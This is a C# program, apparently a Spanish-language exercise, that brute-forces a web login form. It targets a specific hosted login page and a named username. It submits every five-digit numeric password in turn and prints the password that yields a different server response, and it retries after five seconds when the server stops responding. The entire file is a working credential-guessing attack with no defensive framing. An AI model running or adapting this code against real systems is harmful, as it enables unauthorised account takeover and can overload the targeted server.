using System;
using System.Collections;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BruteForceAttack
{
    internal class Program
    {

        public static void POST_REQUEST(string password)
        {
            WebRequest request = WebRequest.Create("http://2603482-0.web-hosting.es/web/login.php");

            request.Method = "POST";

            string postData = "usern=roger.torrell&passw=" + password;

            byte[] byteArray = Encoding.UTF8.GetBytes(postData);

            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = byteArray.Length;

            Stream dataStream = request.GetRequestStream();
            
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();

            WebResponse response = request.GetResponse();

            dataStream = response.GetResponseStream();
            
            StreamReader reader = new StreamReader(dataStream);

            string responseFromServer = reader.ReadToEnd();

            if (responseFromServer != "nooooo")
            {
                Console.WriteLine("La contraseña es: " + password);
            }
            else
            {
                Console.Write(".");
            }
            
            reader.Close();
           
            dataStream.Close();
            response.Close();

        }
        
        
        
        
        public static void Main ()
        {
        
            // Contraseña:
            var password = " ";
            var passwords = new ArrayList();
            
            Console.WriteLine("Probando contraseñas, espere unos minutos...");
            
            // Generador de contraseñas:
            for (int i = 0; i < 99999; i++)
            {

                // Convertir el número en contraseña:
                password = i.ToString();


                // Asegurar las 5 cifras:
                while (password.Length < 5)
                {
                    password = String.Concat("0", password);
                } // END WHILE


                try
                {
                    POST_REQUEST(password);
                }
                catch (WebException e)
                {
                    Console.WriteLine("Parece que el servidor está colapsando, esperemos 5 segundos...");
                    Thread.Sleep(5000);
                    try
                    {
                        POST_REQUEST(password);
                    }
                    catch (WebException e2)
                    {
                        Console.WriteLine("Definitivamente el servidor no responde.");
                    }

                }

            } // END FOR


        } // END MAIN  
    }
    
    
}